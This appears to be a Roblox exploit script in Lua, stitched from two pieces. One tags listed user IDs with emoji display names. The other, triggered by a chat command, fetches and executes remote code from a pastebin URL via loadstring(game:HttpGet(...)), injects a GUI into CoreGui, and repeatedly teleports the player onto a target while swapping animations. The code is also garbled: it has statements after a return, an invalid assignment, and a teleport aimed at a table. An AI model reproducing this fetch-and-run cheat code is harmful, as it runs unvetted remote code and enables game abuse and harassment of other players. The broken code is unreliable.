local Diamond = {
200547759,
2876067334,
}

local cucumber = {
1222177490,
}

local Raider = {
559285229,
}

local ABC = {
1404309014,
}

local iscool = {
970976,
}

local Heart = {
2577863211,
2876067334,
}

local Crown = { -- 👑
2203859765,
2876067334,
2369320991,
2409533825,
}

local Lighting = { --⚡
2385413377,
2876067334,
}

local Ghost = { --👻
1326050294,
}

local Lu = {
30759115,
2876067334,
}

local Ke = {
969017656,
2876067334,
}



ModIDS = {
650311676,
1615693266,
92979984,
1549686627,
1929095914,
2369320991,
2369320991,
2876067334,
2876067334,
2369320991,
2876067334,
2876067334,
2409533825,
2369320991,
}

--\\ Don't mess with anything below this
function swagnames()
    for _,Player in pairs(game:GetService('Players'):GetChildren()) do
        if table.find(Diamond, Player.UserId) then
            if Player.Character then
                if Player.Character.Parent.Name == 'Players' then
                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]' .. Player.DisplayName)
                end
            end
        elseif table.find(cucumber, Player.UserId) then
            if Player.Character then
                if Player.Character.Parent.Name == 'Players' then
                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🥒]' .. Player.DisplayName)
                end
            end
        elseif table.find(Lighting, Player.UserId) then
            if Player.Character then
                if Player.Character.Parent.Name == 'Players' then
                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⚡]' .. Player.DisplayName)
                end
            end      
        elseif table.find(Ghost, Player.UserId) then
            if Player.Character then
                if Player.Character.Parent.Name == 'Players' then
                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👻]' .. Player.DisplayName)
                end
            end 
        elseif table.find(ABC, Player.UserId) then
            if Player.Character then
                if Player.Character.Parent.Name == 'Players' then
                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('😂' .. Player.DisplayName)
                end
            end 
        elseif table.find(ModIDS, Player.UserId) then
        
            if Player.Character then
                if Player.Character.Parent.Name == 'Players' then
                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]' .. Player.DisplayName)
                end
            end
            
        else
            if Player.Character then
                if Player.Character.Parent.Name == 'Players' then
                    if not Player.Character.UpperTorso:FindFirstChild('OriginalSize') then
                        Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[😎]' .. Player.DisplayName)
                    end
                end
            end
        end
    end
end
local success,err = pcall(swagnames)
return ModIDS

--UPDATED! FULLY WORKING!
--Credits to Luckymaxer, DINOSAURXXX, illremember, fe animations, for helping with the Crouch!
local ModIDS = if table.find(ModIDS, Player.UserId)
local Player = game.Players.LocalPlayer

Player.Chatted:connect(function(cht)
	if cht:match(":benx .") then
		loadstring(game:HttpGet("https://pastebin.com/raw/Bv3gABeH"))()
wait(13)
local ScreenGui = Instance.new("ScreenGui")
local TextBox = Instance.new("TextBox")

ScreenGui.Parent = game.CoreGui

TextBox.Parent = ScreenGui
TextBox.BackgroundColor3 = Color3.new(0.333333, 0.333333, 0.333333)
TextBox.Position = UDim2.new(0, 0, 1, -25)
TextBox.Size = UDim2.new(0, 150, 0, 25)
TextBox.Font = Enum.Font.SourceSans
TextBox.Text = "Insert Player"
TextBox.TextColor3 = Color3.new(1, 1, 1)
TextBox.TextScaled = true
TextBox.TextSize = 14
TextBox.TextWrapped = true

game:GetService("UserInputService").InputBegan:connect(function(key)
if key.KeyCode == Enum.KeyCode.e then --Replace E with the key you would like to be pressed
local Player = TextBox.Text
local plr1 = game.Players.LocalPlayer.Character
local plr2 = ModIDS
while true do
plr1.HumanoidRootPart.CFrame = plr2.HumanoidRootPart.CFrame * CFrame.new(0,2,0)
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=182724289"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=182724289"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=182724289"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=182724289"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end
end
end)
	end
end)
